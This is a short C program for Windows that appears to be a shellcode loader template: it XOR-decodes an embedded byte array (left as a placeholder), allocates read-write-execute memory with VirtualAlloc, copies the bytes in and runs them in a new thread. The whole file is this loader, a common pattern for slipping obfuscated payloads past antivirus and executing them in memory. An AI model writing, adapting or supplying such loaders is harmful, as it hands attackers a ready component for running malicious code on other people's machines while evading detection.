#include <Windows.h>
#include <stdio.h>

void xor_decrypt(unsigned char* shellcode, int length, unsigned char key) {
    for (int i = 0; i < length; i++) {
        shellcode[i] ^= key;
    }
}

int main(int argc, char** argv) {
    unsigned char shellcode[] = {
        "...shellcode..."
    };

    int shellcode_length = sizeof(shellcode);
    unsigned char key = 0xAA;
    xor_decrypt(shellcode, shellcode_length, key);

    LPVOID allocated_mem = VirtualAlloc(NULL, shellcode_length, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (allocated_mem == NULL) {
        printf("Failed to allocate memory: %d\n", GetLastError());
        return 1;
    } else { printf("Memory Allocated at address: 0x%p\n", allocated_mem); }
  
    RtlCopyMemory(allocated_mem, shellcode, shellcode_length);
    printf("Shellcode written\n");
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocated_mem, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create thread: %d\n", GetLastError());
        return 1;
    } else { printf("Thread created\n"); }
  
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(allocated_mem, 0, MEM_RELEASE);
    return 0;
}
